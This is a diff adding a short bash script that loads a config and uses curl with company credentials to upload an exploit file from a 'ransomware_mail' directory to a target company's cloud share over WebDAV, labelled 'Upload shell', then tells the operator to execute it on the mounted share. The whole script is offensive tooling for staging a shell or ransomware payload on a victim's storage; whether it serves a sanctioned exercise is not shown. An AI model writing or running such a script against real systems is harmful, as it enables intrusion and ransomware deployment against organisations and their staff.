@@ -1,0 +1,10 @@
+#!/bin/bash
+
+echo "Loading configs/$1"
+source configs/$1
+
+echo "Upload shell"
+curl -u $COMP_USER:$COMP_PWD -T /opt/ransomware_mail/$EXPLOIT_FILE "https://cloud.$COMPANY_DOMAIN/remote.php/dav/files/$COMP_USER/$TARGET_SHARE/$EXPLOIT_FILE"
+
+echo "Done."
+echo "Connect to $TARGET and execute $EXPLOIT_FILE on mounted share."
